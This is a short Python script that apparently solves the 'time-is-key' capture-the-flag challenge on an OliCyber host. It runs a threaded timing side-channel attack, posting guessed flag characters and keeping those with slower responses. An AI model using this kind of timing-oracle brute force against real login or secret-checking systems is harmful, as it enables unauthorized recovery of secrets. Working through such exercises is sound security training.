import requests
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

SITE = "http://time-is-key.challs.olicyber.it/index.php"
MAX_WORKERS = 10

local_data = threading.local()

def get_session():
    if not hasattr(local_data, "session"):
        local_data.session = requests.Session()
        
    return local_data.session

def check_character(character, prefix):
    try:
        response = get_session().post(
            SITE,
            data={
                "flag": prefix + character + "a" * (5 - len(prefix)),
                "submit": "Invia la flag!"
            }
        )

        return character, response.elapsed.total_seconds()

    except requests.RequestException as error:
        print(f"[ERROR] HTTP request failed ({character}): {error}")
        return character, None

def main():
    flag = ""
    print("flag{", end="")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        while len(flag) != 11:
            futures = {
                executor.submit(check_character, character, flag): character
                for character in string.printable
            }

            found = False

            for future in as_completed(futures):
                character, elapsed = future.result()

                if elapsed is not None and elapsed > 1 + len(flag):
                    flag += character
                    print(character, end="")
                    found = True

                    for pending in futures:
                        pending.cancel()

                    break

            if not found:
                break

    print("}")
    
if __name__ == "__main__":
    main()
